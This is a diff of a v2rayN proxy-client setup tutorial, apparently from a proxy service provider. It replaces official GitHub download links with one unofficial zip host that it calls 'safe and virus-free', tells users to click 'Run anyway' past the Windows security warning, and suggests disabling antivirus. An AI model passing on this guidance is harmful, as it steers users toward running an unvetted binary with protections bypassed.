@@ -1,256 +1,145 @@
-# 🚀 v2rayN for Windows
+# 🚀 v2rayN - Recommended Windows Client
 
-> ⚡ **Windows Platform's Preferred Proxy Client** | Multi-protocol support, comprehensive features, easy operation
+> ⚡ **Top Choice for Windows** | Multi-protocol support, comprehensive features, and easy to use.
 
-[v2rayN](https://github.com/2dust/v2rayN) is the most popular graphical proxy client for Windows systems, developed based on the .NET framework, supporting numerous mainstream proxy protocols and providing stable and efficient proxy services.
+**v2rayN** is the most popular graphical proxy client for Windows. Built on the .NET framework, it supports many mainstream proxy protocols, providing users with stable and efficient proxy services.
 
-## 📊 Protocol Support
+### 💻 System Requirements
 
-| Protocol Type | Support Status | Performance | Rating |
-|--------------|----------------|-------------|---------|
-| 🔗 **Shadowsocks (SS)** | ✅ Full Support | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
-| 🛡️ **ShadowsocksR (SSR)** | ✅ Full Support | ⭐⭐⭐⭐ | ⭐⭐⭐ |
-| 🌐 **SOCKS5** | ✅ Full Support | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
-| ⚡ **Snell** | ✅ Full Support | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
-| 🚀 **V2Ray (VMess)** | ✅ Full Support | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
-| 🛡️ **Trojan** | ✅ Full Support | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
-| 🔐 **VLESS** | ✅ Full Support | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
-| 🌊 **Hysteria** | ✅ Full Support | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
+| Item | Minimum | Recommended | Note |
+|------|----------|----------|------|
+| **OS** | Windows 10 (64-bit) | Windows 10/11 Latest | 64-bit systems only |
+| **Processor** | Intel/AMD Dual Core | Quad Core or better | Supports mainstream architectures |
+| **RAM** | 4GB RAM | 8GB+ RAM | Ensures smooth operation |
+| **Storage** | 100MB+ | 500MB+ | For config and logs |
+| **.NET** | .NET 6.0+ | Latest Version | Required environment |
 
-## 🔧 System Requirements
 
-### 💻 Runtime Environment
+## 📥 Official Safe Free Download
 
-| Item | Minimum Requirement | Recommended | Description |
-|------|-------------------|-------------|-------------|
-| **Operating System** | Windows 10 (64-bit) | Windows 10/11 Latest | 64-bit systems only |
-| **Processor** | Intel/AMD Dual-core | Quad-core and above | Supports mainstream CPU architectures |
-| **Memory** | 4GB RAM | 8GB+ RAM | Ensures smooth operation |
-| **Storage** | 100MB+ | 500MB+ | Including config and log files |
-| **.NET Framework** | .NET 6.0+ | Latest version | Required runtime environment |
+We provide a high-speed, free download channel. The file is hosted on cloud storage and is safe and virus-free.
 
-## 📥 Official Downloads
+| Version | Filename | Download Link |
+| :--- | :--- | :--- |
+| **Latest** | `v2rayN.zip` | [**⬇️ Click to Download**](https://download.onsucloud.com/v2rayN.zip) |
 
-> 💡 **Download Recommendation**: Download latest version from official GitHub or mirror sources
-
-### 🌟 Download Source List
-
-| Download Source | Type | Speed | Stability | Rating |
-|----------------|------|-------|-----------|---------|
-| [🚀 Mirror Acceleration 1](https://git.886.be/https://github.com/2dust/v2rayN/releases/download/6.60/v2rayN.zip) | Mirror Source | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
-| [⚡ Mirror Acceleration 2](https://gh.xxooo.cf/https://github.com/2dust/v2rayN/releases/download/6.60/v2rayN.zip) | Mirror Source | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
-| [📦 Official GitHub](https://github.com/2dust/v2rayN/releases/download/6.60/v2rayN.zip) | Official Source | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
-
-### 📋 Version Information
-
-- **Current Version**: v6.60
-- **Release Date**: November 2024
-- **File Size**: ~15MB
-- **File Format**: ZIP archive
-
-## 🚀 Complete Usage Tutorial
-
-### 📥 Step 1: Download and Extract
-
-1. **Download the software**
-   - Choose any download link above
-   - Download the `v2rayN.zip` file
-
-2. **Extract files**
-   - Extract to your preferred directory
-   - Ensure path contains no Chinese characters
-
-### 🚀 Step 2: Launch Application
-
-![Launch v2rayN](v2rayN-for-windows-0.png)
-
-> **First Launch**: Double-click `v2rayN.exe` to start the application
-
-### 📋 Step 3: Copy Subscription
-
-![Copy Subscription](v2rayN-for-windows-1.png)
-
-> **Get Subscription**: Copy your subscription link from service provider
-
-### 📥 Step 4: Import Subscription
-
-![Import Subscription](v2rayN-for-windows-2.png)
-
-> **Add Subscription**: Paste subscription link in the import dialog
-
-### 🔄 Step 5: Update Nodes
-
-![Update Nodes](v2rayN-for-windows-3.png)
-
-> **Update Subscription**: Refresh to get latest node information
-
-### ⚡ Step 6: Enable Proxy
-
-![Enable Proxy](v2rayN-for-windows-4.png)
-
-> **System Proxy**: Enable system-wide proxy settings
-
-### 🔄 Step 7: Switch Nodes
-
-![Switch Nodes](v2rayN-for-windows-5.png)
-
-> **Node Selection**: Choose optimal server for your needs
-
-### 🔴 Step 8: Disable Proxy
-
-![Disable Proxy](v2rayN-for-windows-6.png)
-
-> **Stop Service**: Disable proxy when not needed
-
-## 🎛️ Advanced Features
-
-### 🎯 Smart Routing
-
-- **PAC Mode**: Automatic proxy for blocked sites only
-- **Global Mode**: Route all traffic through proxy
-- **Direct Mode**: Bypass proxy for all traffic
-
-### 📊 Performance Monitoring
-
-- **Real-time Statistics**: Monitor upload/download speeds
-- **Connection Logs**: Detailed connection information
-- **Latency Testing**: Test server response times
-- **Traffic Analysis**: Analyze data usage patterns
-
-### 🔧 Configuration Management
-
-- **Multiple Profiles**: Support for multiple configuration files
-- **Auto Updates**: Automatic subscription updates
-- **Backup/Restore**: Configuration backup and restoration
-- **Custom Rules**: Advanced routing rule customization
-
-## ❓ Frequently Asked Questions
-
-### 🔧 Installation Issues
-
-**Q: Software won't start or shows errors?**
-
-A: Common solutions:
-
-1. Ensure .NET 6.0+ is installed
-2. Run as administrator
-3. Check Windows Defender/antivirus settings
-4. Verify file integrity
-
-**Q: "Access denied" error?**
-
-A: Permission solutions:
-
-1. Extract to a user-writable directory
-2. Run as administrator
-3. Add exception to antivirus software
-4. Check Windows UAC settings
-
-### 🌐 Connection Issues
-
-**Q: Can't connect after configuration?**
-
-A: Troubleshooting steps:
-
-1. ✅ Verify subscription link validity
-2. ✅ Check network connectivity
-3. ✅ Test different server nodes
-4. ✅ Confirm firewall settings
-
-**Q: Slow speeds or frequent disconnections?**
-
-A: Performance optimization:
-
-1. 🔄 Select servers with lower latency
-2. 🎯 Switch between different proxy modes
-3. 📊 Check local network conditions
-4. 🔧 Try different encryption protocols
-
-### ⚙️ Configuration Issues
-
-**Q: How to update subscription?**
-
-A: Update steps:
-
-1. Right-click system tray icon
-2. Select "Update subscription"
-3. Wait for automatic update completion
-
-**Q: How to backup configuration?**
-
-A: Backup method:
-
-1. Locate configuration files in program directory
-2. Copy entire folder to safe location
-3. Restore by replacing files when needed
-
-## 🔄 Version History
-
-- **v6.60 (2024.11)**: Performance optimization, new protocol support
-- **v6.50 (2024.09)**: Interface improvements, bug fixes
-- **v6.40 (2024.07)**: Enhanced stability, new features added
-
-## 💡 Usage Tips
-
-### ⚡ Performance Optimization
-
-1. **Mode Selection**
-   - Use PAC mode for daily browsing
-   - Global mode for special requirements
-   - Direct mode for troubleshooting
-
-2. **Regular Maintenance**
-   - Update subscriptions weekly
-   - Clear logs periodically
-   - Keep software updated
-
-3. **Server Optimization**
-   - Choose geographically closer servers
-   - Select appropriate protocols for use case
-   - Avoid frequent server switching
-
-### 🛡️ Security Recommendations
-
-1. **Service Selection**: Use trusted proxy service providers
-2. **Configuration Security**: Regularly change passwords and configurations
-3. **Network Security**: Avoid using on public networks
-
-## 📚 Related Resources
-
-### 📖 Official Documentation
-
-- [v2rayN Official Repository](https://github.com/2dust/v2rayN)
-- [V2Ray Core Documentation](https://www.v2ray.com/)
-- [Protocol Configuration Examples](https://github.com/2dust/v2rayN/wiki)
-
-### 🛠️ Useful Tools
-
-- **Configuration Converters**: [Online converter tools](https://acl4ssr.netlify.app/)
-- **Rule Subscriptions**: [ACL4SSR Rules](https://github.com/ACL4SSR/ACL4SSR)
-- **Server Testing**: Built-in latency testing feature
-
-## 🎯 Summary and Evaluation
-
-### ✅ Advantages
-
-- 🖥️ **Native Windows Experience**: Perfect Windows system integration
-- ⚡ **Excellent Performance**: Efficient proxy processing capabilities
-- 🔧 **Professional Features**: Rich configuration options
-- 🆓 **Free and Open Source**: No cost, transparent code
-
-### ❌ Limitations
-
-- 📚 **Learning Curve**: Requires some learning compared to simple tools
-- 🎨 **Simple Interface**: Relatively basic UI, functionality-focused
-- 🔧 **Complex Configuration**: Advanced features require technical knowledge
-
-### 🎯 Target Users
-
-- 💻 **Windows Users**: Optimized for Windows operating system
-- 🔧 **Tech Enthusiasts**: Users who enjoy customization and configuration
-- 🛡️ **Stability-focused**: Users prioritizing long-term stability
-- 🆓 **Budget-conscious**: Those wanting powerful free tools
+> ⚠️ **Important Note for Self-Downloading**
+> 
+> If you choose to find the installation package yourself, please ensure you use **official channels** (such as GitHub). Do not download modified versions from unknown sources to avoid malware.
+> 
+> **Special Attention**: Please ensure you download the **Latest Version**! Due to our support for the new Xray/Reality protocols, **older versions of the client may not connect**.
 
 ---
 
-> 📅 Last Updated: July 10, 2025 | ⚡ Applicable Version: v2rayN 6.60
+## 🚀 Step-by-Step Tutorial
+
+### 🎯 Step 1: Start the Application
+
+Download and unzip v2rayN to any folder, then double-click `v2rayN.exe` to launch the program.
+
+![Start Interface](-0.png)
+
+> **First Run Prompt**: The program will automatically check the runtime environment. If components are missing, please install them as prompted. If a Windows security window pops up, click **More info**, then select **Run anyway**.
+
+![More Info](-1.png)
+![Run Anyway](-2.png)
+
+### 📋 Step 2: Get Subscription Link
+
+![Copy Subscription](-4.png)
+
+> **Get Link**: **Copy the subscription link** from the User Center.
+
+### 📥 Step 3: Import Subscription
+
+![Import Subscription](v2rayN-for-windows-2.png)
+
+> **Import Method**: Paste the subscription link in the subscription settings. Multiple subscriptions can be managed simultaneously.
+
+### 🔄 Step 4: Update Subscription Nodes
+
+![Update Subscription](v2rayN-for-windows-3.png)
+
+> **Auto Update**: Update your subscription regularly to get the latest node information and configurations.
+
+### ▶️ Step 5: Enable System Proxy
+
+![Enable Proxy](v2rayN-for-windows-4.png)
+
+> **Proxy Mode**: You can choose between "Set system proxy", "PAC mode", or manual configuration.
+
+### 🎛️ Step 6: Select Server Node
+
+![Select Node](v2rayN-for-windows-5.png)
+
+> **Node Selection**: Choose the most suitable server node based on speed test results and latency.
+
+### ⏹️ Step 7: Stop Proxy Service
+
+![Stop Proxy](v2rayN-for-windows-6.png)
+
+> **Safe Exit**: Remember to turn off the proxy ("Clear system proxy") when you are done to restore normal network settings.
+
+---
+
+## ❓ FAQ
+
+### 🔧 Installation & Config
+
+**Q: What if it says ".NET Framework missing" at startup?**
+
+A: Steps to resolve:
+
+1. Visit the Microsoft website to download .NET 6.0 or a higher version.
+2. Restart your computer after installation.
+3. Relaunch the v2rayN program.
+4. If issues persist, try running as Administrator.
+
+**Q: The program won't start or crashes?**
+
+A: Troubleshooting:
+
+1. Check if your system is 64-bit.
+2. Confirm the .NET framework version is correct.
+3. Temporarily disable antivirus software and try again.
+4. Check if the program directory has write permissions.
+
+### 🌐 Usage Issues
+
+**Q: Subscription update failed?**
+
+A: Solutions:
+
+1. Check if your internet connection is normal.
+2. Verify if the subscription link is valid.
+3. Try copying the link manually and adding it again.
+4. Check if it's being blocked by a firewall.
+
+**Q: Connected but no internet access?**
+
+A: Checklist:
+
+1. Confirm "Set system proxy" is enabled.
+2. Check browser proxy settings.
+3. Try switching to a different server node.
+4. Check the program logs for error messages.
+
+**Q: The speed is very slow?**
+
+A: Optimization tips:
+
+1. Choose a server node with lower latency.
+2. Try different protocol types (e.g., VMess vs Trojan).
+3. Adjust connection count and timeout settings.
+4. Use the speed test function to find the fastest node.
+
+---
+## 🎫 Need More Help?
+
+If you encounter any issues during use, or if the FAQ above does not resolve your situation, please feel free to contact us:
+
+Please log in to the website backend, go to **"User & Support"** → **"Ticket Management"** to submit a ticket.
+
+> 💡 **We are here to serve you**
+> 
+> Upon receiving your ticket, our technical support team will investigate and resolve it as soon as possible. To improve efficiency, we recommend attaching **screenshots of errors** or a **detailed description** in your ticket.
